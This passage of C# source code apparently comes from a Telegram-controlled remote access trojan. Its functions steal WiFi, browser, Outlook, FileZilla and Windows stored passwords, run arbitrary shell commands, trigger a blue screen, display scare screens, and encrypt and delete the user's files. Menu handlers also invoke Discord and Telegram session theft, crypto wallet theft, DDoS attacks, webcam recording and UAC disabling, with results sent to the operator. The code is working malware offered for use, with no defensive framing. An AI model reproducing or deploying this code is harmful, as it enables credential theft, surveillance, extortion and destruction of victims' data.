        }
    }

    private static string GetSystemInfo()
    {
        try
        {
            StringBuilder sb = new StringBuilder();

            sb.AppendLine("=== System Information ===");
            sb.AppendLine($"Computer: {Environment.MachineName}");
            sb.AppendLine($"User: {Environment.UserName}");
            sb.AppendLine($"OS: {Environment.OSVersion}");
            sb.AppendLine($".NET: {Environment.Version}");
            sb.AppendLine($"Processors: {Environment.ProcessorCount}");
            sb.AppendLine($"System Directory: {Environment.SystemDirectory}");

            sb.AppendLine("\n=== Drives ===");
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady)
                {
                    sb.AppendLine($"{drive.Name} - {drive.TotalFreeSpace / (1024 * 1024 * 1024)} GB free of {drive.TotalSize / (1024 * 1024 * 1024)} GB");
                }
            }

            sb.AppendLine("\n=== Network ===");
            sb.AppendLine($"Domain: {Environment.UserDomainName}");

            sb.AppendLine("\n=== Processes (top 10) ===");
            var processes = Process.GetProcesses()
                .OrderByDescending(p => p.WorkingSet64)
                .Take(10);

            foreach (var process in processes)
            {
                try
                {
                    sb.AppendLine($"{process.ProcessName} - {process.WorkingSet64 / (1024 * 1024)} MB");
                }
                catch { }
            }

            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"Error getting system info: {ex.Message}";
        }
    }

    private static string StealPasswords()
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== 🔑 Stolen Passwords ===");

            // 1. WiFi пароли
            sb.AppendLine("\n=== 📶 WiFi Passwords ===");
            string wifiProfiles = ExecuteCommand("netsh", "wlan show profiles");
            foreach (string line in wifiProfiles.Split('\n').Where(l => l.Contains("All User Profile")))
            {
                try
                {
                    string profileName = line.Split(':')[1].Trim();
                    string profileInfo = ExecuteCommand("netsh", $"wlan show profile name=\"{profileName}\" key=clear");
                    string passwordLine = profileInfo.Split('\n').FirstOrDefault(l => l.Contains("Key Content"));

                    if (passwordLine != null)
                    {
                        string password = passwordLine.Split(':')[1].Trim();
                        sb.AppendLine($"{profileName}: {password}");
                    }
                }
                catch { }
            }

            // 2. Браузерные пароли (Chrome, Edge, Opera, Firefox)
            sb.AppendLine("\n=== 🌐 Browser Passwords ===");
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // Chrome, Edge, Opera
            string[] chromiumBrowsers = {
            "Google\\Chrome",
            "Microsoft\\Edge",
            "Opera Software\\Opera Stable",
            "BraveSoftware\\Brave-Browser",
            "Vivaldi",
            "Yandex\\YandexBrowser"
        };

            foreach (string browser in chromiumBrowsers)
            {
                string loginDataPath = Path.Combine(appData, browser, "User Data", "Default", "Login Data");
                if (System.IO.File.Exists(loginDataPath))
                {
                    try
                    {
                        string tempFile = Path.GetTempFileName();
                        System.IO.File.Copy(loginDataPath, tempFile, true);

                        using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                        {
                            conn.Open();
                            using (var cmd = conn.CreateCommand())
                            {
                                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                                using (var reader = cmd.ExecuteReader())
                                {
                                    sb.AppendLine($"\n🔵 {browser.Split('\\').Last()} Passwords:");
                                    while (reader.Read())
                                    {
                                        string url = reader.GetString(0);
                                        string username = reader.GetString(1);
                                        byte[] encryptedPassword = (byte[])reader[2];

                                        if (encryptedPassword.Length > 0)
                                        {
                                            string password = Encoding.UTF8.GetString(
                                                ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));

                                            if (!string.IsNullOrWhiteSpace(url) && !string.IsNullOrWhiteSpace(username))
                                            {
                                                sb.AppendLine($"🌐 {url} | 👤 {username} | 🔑 {password}");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        System.IO.File.Delete(tempFile);
                    }
                    catch { }
                }
            }

            // Firefox
            string firefoxPath = Path.Combine(roamingAppData, "Mozilla", "Firefox", "Profiles");
            if (Directory.Exists(firefoxPath))
            {
                foreach (string profileDir in Directory.GetDirectories(firefoxPath))
                {
                    string signonsPath = Path.Combine(profileDir, "logins.json");
                    string key4DbPath = Path.Combine(profileDir, "key4.db");

                    if (System.IO.File.Exists(signonsPath) && System.IO.File.Exists(key4DbPath))
                    {
                        try
                        {
                            // Для Firefox требуется более сложная логика дешифровки с использованием NSS
                            // Здесь упрощенная версия, в реальности нужно использовать библиотеки для работы с NSS
                            dynamic logins = JsonConvert.DeserializeObject(System.IO.File.ReadAllText(signonsPath));
                            if (logins?.logins != null)
                            {
                                sb.AppendLine($"\n🟠 Firefox Passwords:");
                                foreach (var login in logins.logins)
                                {
                                    string url = login.hostname;
                                    string username = login.username;
                                    string encryptedPassword = login.password;

                                    // В реальной реализации здесь должна быть дешифровка через NSS
                                    sb.AppendLine($"🌐 {url} | 👤 {username} | 🔑 [ENCRYPTED - requires NSS decryption]");
                                }
                            }
                        }
                        catch { }
                    }
                }
            }

            // 3. Пароли из диспетчера учетных данных Windows
            sb.AppendLine("\n=== 🖥️ Windows Credential Manager ===");
            try
            {
                using (var cmd = new System.Diagnostics.Process())
                {
                    cmd.StartInfo.FileName = "cmdkey.exe";
                    cmd.StartInfo.Arguments = "/list";
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.Start();

                    string output = cmd.StandardOutput.ReadToEnd();
                    cmd.WaitForExit();

                    foreach (string line in output.Split('\n').Where(l => l.Contains("Target:")))
                    {
                        sb.AppendLine(line.Trim());
                    }
                }

                // Чтение сохраненных паролей из реестра
                using (var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Credentials", false))
                {
                    if (regKey != null)
                    {
                        foreach (string subKeyName in regKey.GetSubKeyNames())
                        {
                            using (var subKey = regKey.OpenSubKey(subKeyName))
                            {
                                var values = subKey?.GetValueNames();
                                if (values != null && values.Contains("Password"))
                                {
                                    byte[] encryptedPassword = (byte[])subKey.GetValue("Password");
                                    string password = Encoding.UTF8.GetString(
                                        ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));
                                    sb.AppendLine($"🔑 {subKeyName}: {password}");
                                }
                            }
                        }
                    }
                }
            }
            catch { }

            // 4. Пароли из почтовых клиентов
            sb.AppendLine("\n=== 📧 Email Clients Passwords ===");
            try
            {
                // Outlook
                string outlookRegPath = "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676";
                using (var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(outlookRegPath, false))
                {
                    if (regKey != null)
                    {
                        foreach (string valueName in regKey.GetValueNames().Where(n => n.Contains("Password")))
                        {
                            try
                            {
                                byte[] encryptedPassword = (byte[])regKey.GetValue(valueName);
                                string password = Encoding.UTF8.GetString(
                                    ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));
                                sb.AppendLine($"📧 Outlook: {password}");
                            }
                            catch { }
                        }
                    }
                }
            }
            catch { }

            // 5. Пароли из FTP-клиентов (FileZilla)
            sb.AppendLine("\n=== 📁 FTP Clients Passwords ===");
            try
            {
                string fileZillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "FileZilla", "recentservers.xml");
                if (System.IO.File.Exists(fileZillaPath))
                {
                    XDocument doc = XDocument.Load(fileZillaPath);
                    var servers = doc.Descendants("Server");
                    foreach (var server in servers)
                    {
                        string host = server.Element("Host")?.Value;
                        string user = server.Element("User")?.Value;
                        string pass = server.Element("Pass")?.Value;

                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(pass))
                        {
                            // Пароли в FileZilla хранятся в base64
                            try
                            {
                                string password = Encoding.UTF8.GetString(Convert.FromBase64String(pass));
                                sb.AppendLine($"📁 FileZilla: {host} | 👤 {user} | 🔑 {password}");
                            }
                            catch
                            {
                                sb.AppendLine($"📁 FileZilla: {host} | 👤 {user} | 🔑 [BASE64]: {pass}");
                            }
                        }
                    }
                }
            }
            catch { }

            // 6. Пароли из RDP-подключений
            sb.AppendLine("\n=== 🖥️ RDP Connections Passwords ===");
            try
            {
                string rdpConnectionsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Credentials", "*");

                foreach (string credFile in Directory.GetFiles(Path.GetDirectoryName(rdpConnectionsPath),
                    Path.GetFileName(rdpConnectionsPath)))
                {
                    try
                    {
                        byte[] credData = System.IO.File.ReadAllBytes(credFile);
                        // Здесь должна быть логика дешифровки DPAPI
                        sb.AppendLine($"🔐 RDP Credential File: {Path.GetFileName(credFile)}");
                    }
                    catch { }
                }
            }
            catch { }

            // 7. Пароли из игровых клиентов (Steam и др.)
            sb.AppendLine("\n=== 🎮 Game Clients Passwords ===");
            try
            {
                // Steam
                string steamPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "Steam", "config", "loginusers.vdf");
                if (System.IO.File.Exists(steamPath))
                {
                    string steamContent = System.IO.File.ReadAllText(steamPath);
                    var matches = Regex.Matches(steamContent, "\"AccountName\"\\s+\"([^\"]+)\"");
                    foreach (Match match in matches)
                    {
                        if (match.Groups.Count > 1)
                        {
                            sb.AppendLine($"🎮 Steam Account: {match.Groups[1].Value}");
                        }
                    }
                }
            }
            catch { }

            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"❌ Error stealing passwords: {ex.Message}";
        }
    }

    private static string GetNetworkInfo()
    {
        try
        {
            StringBuilder sb = new StringBuilder();

            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                sb.AppendLine($"Interface: {ni.Name}");
                sb.AppendLine($"Type: {ni.NetworkInterfaceType}");
                sb.AppendLine($"MAC: {ni.GetPhysicalAddress()}");

                if (ni.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        sb.AppendLine($"IP: {ip.Address}");
                    }
                }
                sb.AppendLine();
            }

            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();

            foreach (TcpConnectionInformation c in connections)
            {
                sb.AppendLine($"{c.LocalEndPoint} -> {c.RemoteEndPoint} [{c.State}]");
            }

            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"Error getting network info: {ex.Message}";
        }
    }

    private static string ListAllFiles(string path)
    {
        try
        {
            StringBuilder sb = new StringBuilder();

            if (!Directory.Exists(path))
            {
                return $"Directory not found: {path}";
            }

            foreach (string file in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
            {
                try
                {
                    var info = new FileInfo(file);
                    sb.AppendLine($"{info.FullName} | {info.Length / 1024} KB | {info.LastWriteTime}");
                }
                catch { }
            }

            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"Error listing files: {ex.Message}";
        }
    }

    private static string GetLocation()
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                string ip = client.DownloadString("https://api.ipify.org");
                string location = client.DownloadString($"http://ip-api.com/line/{ip}");
                return $"{ip}\n{location}";
            }
        }
        catch (Exception ex)
        {
            return $"Error getting location: {ex.Message}";
        }
    }

    private static string TriggerBSOD()
    {
        try
        {
            bool t;
            RtlAdjustPrivilege(19, true, false, out t);
            NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out uint response);
            return "BSOD triggered";
        }
        catch (Exception ex)
        {
            return $"Failed to trigger BSOD: {ex.Message}";
        }
    }

    private static void MoveMouse(int x, int y)
    {
        SetCursorPos(x, y);
    }

    private static void MouseClick()
    {
        mouse_event(0x0002, 0, 0, 0, 0);
        mouse_event(0x0004, 0, 0, 0, 0);
    }

    private static async Task PixellateScreen()
    {
        try
        {
            Form form = new Form()
            {
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                TopMost = true
            };

            PictureBox pb = new PictureBox()
            {
                Dock = DockStyle.Fill,
                SizeMode = PictureBoxSizeMode.StretchImage
            };
            form.Controls.Add(pb);

            Task.Run(() => Application.Run(form));

            while (form.IsHandleCreated)
            {
                using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width / 10, Screen.PrimaryScreen.Bounds.Height / 10))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                    pb.Image = new Bitmap(bmp, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                }
                await Task.Delay(50);
            }
        }
        catch { }
    }

    private static async Task ScareUser()
    {
        try
        {
            Form form = new Form()
            {
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                TopMost = true,
                BackColor = System.Drawing.Color.Red
            };

            Label label = new Label()
            {
                Text = "YOUR COMPUTER HAS BEEN HACKED",
                Font = new Font("Arial", 40, FontStyle.Bold),
                ForeColor = System.Drawing.Color.White
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleCenter
            };
            form.Controls.Add(label);

            Task.Run(() => Application.Run(form));
            await Task.Delay(10000);
            form.Invoke((MethodInvoker)(() => form.Close()));
        }
        catch { }
    }

    private static void ShowMessageBox(string text)
    {
        MessageBox(0, text, "System Alert", 0x00040000);
    }

    private static string KillProcess(string processName)
    {
        try
        {
            var processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0)
                return "Process not found";

            foreach (var process in processes)
            {
                process.Kill();
            }
            return $"Killed {processes.Length} process(es)";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static string StartProcess(string processName)
    {
        try
        {
            Process.Start(processName);
            return "Process started";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static string ShutdownPC()
    {
        try
        {
            Process.Start("shutdown", "/s /t 0");
            return "Shutdown initiated";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static string RebootPC()
    {
        try
        {
            Process.Start("shutdown", "/r /t 0");
            return "Reboot initiated";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static async Task<string> SetWallpaperFromDocument(Document document)
    {
        try
        {
            string tempFile = Path.GetTempFileName() + Path.GetExtension(document.FileName);
            var file = await botClient.GetFileAsync(document.FileId);
            using (var fs = new FileStream(tempFile, FileMode.Create))
            {
                await botClient.DownloadFileAsync(file.FilePath, fs);
            }

            SystemParametersInfo(20, 0, tempFile, 0x01 | 0x02);
            return "Wallpaper changed";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static async Task EncryptFiles(string path, long chatId)
    {
        try
        {
            await SendSafeTextMessage(chatId, $"🔒 Starting encryption of: {path}");

            if (System.IO.File.Exists(path))
            {
                await EncryptFile(path, chatId);
            }
            else if (Directory.Exists(path))
            {
                await EncryptDirectory(path, chatId);
            }
            else
            {
                await SendSafeTextMessage(chatId, $"❌ Path not found: {path}");
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Encryption error: {ex.Message}");
        }
    }

    private static async Task EncryptDirectory(string directoryPath, long chatId)
    {
        int filesEncrypted = 0;

        // Encrypt all files in directory and subdirectories
        foreach (string file in Directory.GetFiles(directoryPath, "*.*", SearchOption.AllDirectories))
        {
            try
            {
                await EncryptFile(file, chatId);
                filesEncrypted++;
            }
            catch { }
        }

        await SendSafeTextMessage(chatId, $"✅ Encryption complete. {filesEncrypted} files encrypted.");
    }

    private static async Task BrokenPixelEffect()
    {
        try
        {
            // Создаем новую форму в отдельном потоке
            var effectThread = new Thread(() =>
            {
                try
                {
                    // Получаем размеры экрана
                    int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                    int screenHeight = Screen.PrimaryScreen.Bounds.Height;

                    // Создаем список битых пикселей
                    var rnd = new Random();
                    var deadPixels = new List<Point>();
                    for (int i = 0; i < rnd.Next(50, 150); i++)
                    {
                        deadPixels.Add(new Point(
                            rnd.Next(0, screenWidth),
                            rnd.Next(0, screenHeight)));
                    }

                    // Создаем форму для отображения эффекта
                    var form = new Form
                    {
                        FormBorderStyle = FormBorderStyle.None,
                        WindowState = FormWindowState.Maximized,
                        TopMost = true,
                        ShowInTaskbar = false,
                        BackColor = System.Drawing.Color.Black
TransparencyKey = System.Drawing.Color.Black
                        Opacity = 0.99
                    };

                    // Устанавливаем стили окна
                    SetWindowToolWindow(form.Handle);
                    SetWindowClickThrough(form.Handle);

                    // Делаем форму кликабельной (пропускает клики)
                    form.FormClosing += (formSender, formClosingE) => formClosingE.Cancel = true;

                    var timer = new System.Windows.Forms.Timer { Interval = 50 };
                    timer.Tick += (sender, e) => form.Invalidate();

                    form.Paint += (paintSender, paintE) =>
                    {
                        // Рисуем битые пиксели
                        foreach (var pixel in deadPixels)
                        {
                            var color = GetRandomPixelColor(rnd);
                            paintE.Graphics.FillRectangle(new SolidBrush(color), pixel.X, pixel.Y, 1, 1);
                        }
                    };

                    // Секретная комбинация для закрытия
                    form.KeyPreview = true;
                    form.KeyDown += (keySender, keyE) =>
                    {
                        if (keyE.Control && keyE.Alt && keyE.Shift && keyE.KeyCode == Keys.B)
                        {
                            timer.Stop();
                            form.FormClosing -= (formClosingSender, formClosingE) => formClosingE.Cancel = true;
                            form.Close();
                        }
                    };

                    timer.Start();
                    Application.Run(form);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error in effect thread: {ex.Message}");
                }
            });

            // Настраиваем поток
            effectThread.SetApartmentState(ApartmentState.STA);
            effectThread.IsBackground = true;
            effectThread.Start();

            await SendSafeTextMessage(adminChatId, $"🖤 Broken pixel effect activated ({currentPcId})");
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(adminChatId, $"❌ Error activating broken pixels: {ex.Message}");
        }
    }

    [DllImport("user32.dll")]
    private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll")]
    private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    private static void SetWindowClickThrough(IntPtr handle)
    {
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TRANSPARENT = 0x20;
        const int WS_EX_LAYERED = 0x80000;

        int style = GetWindowLong(handle, GWL_EXSTYLE);
        SetWindowLong(handle, GWL_EXSTYLE, style | WS_EX_TRANSPARENT | WS_EX_LAYERED);
    }

    private static System.Drawing.Color GetRandomPixelColor(Random rnd)
{
    var colors = new[] { 
        System.Drawing.Color.Red, 
        System.Drawing.Color.Green, 
        System.Drawing.Color.Blue, 
        System.Drawing.Color.White, 
        System.Drawing.Color.Black 
    };
    return colors[rnd.Next(colors.Length)];
    }

    private static void SetWindowToolWindow(IntPtr handle)
    {
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TOOLWINDOW = 0x80;

        int style = GetWindowLong(handle, GWL_EXSTYLE);
        SetWindowLong(handle, GWL_EXSTYLE, style | WS_EX_TOOLWINDOW);
    }

    private static async Task EncryptFile(string filePath, long chatId)
    {
        try
        {
            // Skip already encrypted files
            if (filePath.EndsWith(".enc"))
            {
                return;
            }

            byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
            byte[] encryptedBytes = EncryptBytes(fileBytes);

            // Write encrypted file with .enc extension
            System.IO.File.WriteAllBytes(filePath + ".enc", encryptedBytes);

            // Delete original file
            System.IO.File.Delete(filePath);

            await SendSafeTextMessage(chatId, $"🔒 Encrypted: {filePath}");
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Error encrypting {filePath}: {ex.Message}");
            throw;
        }
    }

    private static async Task DecryptFiles(string path, long chatId)
    {
        try
        {
            await SendSafeTextMessage(chatId, $"🔓 Starting decryption of: {path}");

            if (System.IO.File.Exists(path))
            {
                await DecryptFile(path, chatId);
            }
            else if (Directory.Exists(path))
            {
                await DecryptDirectory(path, chatId);
            }
            else
            {
                await SendSafeTextMessage(chatId, $"❌ Path not found: {path}");
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Decryption error: {ex.Message}");
        }
    }

    private static async Task DecryptDirectory(string directoryPath, long chatId)
    {
        int filesDecrypted = 0;

        // Decrypt all encrypted files in directory and subdirectories
        foreach (string file in Directory.GetFiles(directoryPath, "*.enc", SearchOption.AllDirectories))
        {
            try
            {
                await DecryptFile(file, chatId);
                filesDecrypted++;
            }
            catch { }
        }

        await SendSafeTextMessage(chatId, $"✅ Decryption complete. {filesDecrypted} files decrypted.");
    }

    private static async Task DecryptFile(string filePath, long chatId)
    {
        try
        {
            // Skip non-encrypted files
            if (!filePath.EndsWith(".enc"))
            {
                return;
            }

            byte[] encryptedBytes = System.IO.File.ReadAllBytes(filePath);
            byte[] decryptedBytes = DecryptBytes(encryptedBytes);

            // Write decrypted file without .enc extension
            string originalPath = filePath.Substring(0, filePath.Length - 4);
            System.IO.File.WriteAllBytes(originalPath, decryptedBytes);

            // Delete encrypted file
            System.IO.File.Delete(filePath);

            await SendSafeTextMessage(chatId, $"🔓 Decrypted: {filePath}");
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Error decrypting {filePath}: {ex.Message}");
            throw;
        }
    }

    private static byte[] EncryptBytes(byte[] data)
    {
        using (Aes aes = Aes.Create())
        {
            // Generate a unique key based on machine ID and admin chat ID
            string keyBase = $"{currentPcId}_{adminChatId}";
            byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keyBase));
            byte[] iv = new byte[16]; // Initialization vector

            aes.Key = key;
            aes.IV = iv;

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }
    }

    private static byte[] DecryptBytes(byte[] encryptedData)
    {
        using (Aes aes = Aes.Create())
        {
            // Generate the same key used for encryption
            string keyBase = $"{currentPcId}_{adminChatId}";
            byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keyBase));
            byte[] iv = new byte[16]; // Initialization vector

            aes.Key = key;
            aes.IV = iv;

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(encryptedData, 0, encryptedData.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }
    }

    private static string ShellExecute(string command)
    {
        try
        {
            Process.Start("cmd.exe", $"/c {command}");
            return "Command executed";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static async Task HandleCallbackQueryAsync(ITelegramBotClient botClient, CallbackQuery callbackQuery)
    {
        if (callbackQuery.Message == null)
            return;

        string[] callbackData = callbackQuery.Data.Split('|');
        string action = callbackData[0];
        string parameter = callbackData.Length > 1 ? callbackData[1] : "";

        try
        {
            switch (action)
            {
                case "select_pc":
                    selectedPcId = parameter;
                    isTargetPc = selectedPcId.Equals(currentPcId, StringComparison.OrdinalIgnoreCase);
                    await botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"Selected PC: {selectedPcId}");
                    await ShowCommandMenu(callbackQuery.Message.Chat.Id);
                    break;

                case "command":
                    currentCommand = parameter;
                    if (parameter == "screen")
                    {
                        await HandleScreenshotCommand(botClient, callbackQuery.Message.Chat.Id);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    if (parameter == "stealcrypto")
                    {
                        string result = await StealCryptoWallets();
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, result, "crypto_wallets.txt");
                    }
                    else if (parameter == "stealwifi")
                    {
                        string result = GetWiFiPasswords();
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, result, "wifi_passwords.txt");
                    }
                    if (parameter == "soundmax")
                    {
                        string result = SetVolume(100);
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔊 Volume set to MAX ({currentPcId}): {result}");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "encrypt")
                    {
                        currentCommand = "encrypt";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter path to file or directory to encrypt:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "decrypt")
                    {
                        currentCommand = "decrypt";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter path to file or directory to decrypt:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "soundmin")
                    {
                        string result = SetVolume(0);
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔈 Volume set to MIN ({currentPcId}): {result}");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "screammake")
                    {
                        currentCommand = "screammake";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "send video file (MP4, AVI, WMV):");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "screambuilder")
                    {
                        currentCommand = "screambuilder";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Send an image or video file for the scream (with optional sound file if image), then specify duration in seconds");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "cmd")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter CMD command:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "startddos")
                    {
                        currentCommand = "startddos";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter url to DDoS:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "changewallpaper")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Send an image as a document to set as wallpaper.");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "getlocation")
                    {
                        string location = GetLocation();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"📍 Location: {location} ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stopddos")
                    {
                        await StopDDoS(callbackQuery.Message.Chat.Id);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "brokenpixels")
                    {
                        await BrokenPixelEffect();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🖤 Broken pixel effect activated ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "ps")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter PowerShell script:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "exe")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter EXE path and parameters:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stealdiscord")
                    {
                        string result = await StealDiscordTokens();
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, result, "discord_tokens.txt");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "fullscreenvideo")
                    {
                        currentCommand = "fullscreenvideo";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Отправьте видеофайл для воспроизведения на весь экран");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "minimizeall")
                    {
                        string result = MinimizeAllWindows();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, result);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "closewindow")
                    {
                        string result = CloseActiveWindow();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, result);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stealtelegram")
                    {
                        string result = await StealTelegramSessions();
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, result, "telegram_sessions.zip");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "webcam")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter seconds to record:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "record")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter seconds to record:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "disableuac")
                    {
                        string result = DisableUAC();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔓 UAC ({currentPcId}):\n{result}");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "download")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter file URL to download:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "upload")
                    {
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Send file as document to upload:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "sysinfo")
                    {
                        string sysInfo = GetSystemInfo();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🖥️ System Info ({currentPcId}):\n{sysInfo}", true);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stealsteam")
                    {
                        string result = await StealSteamData();
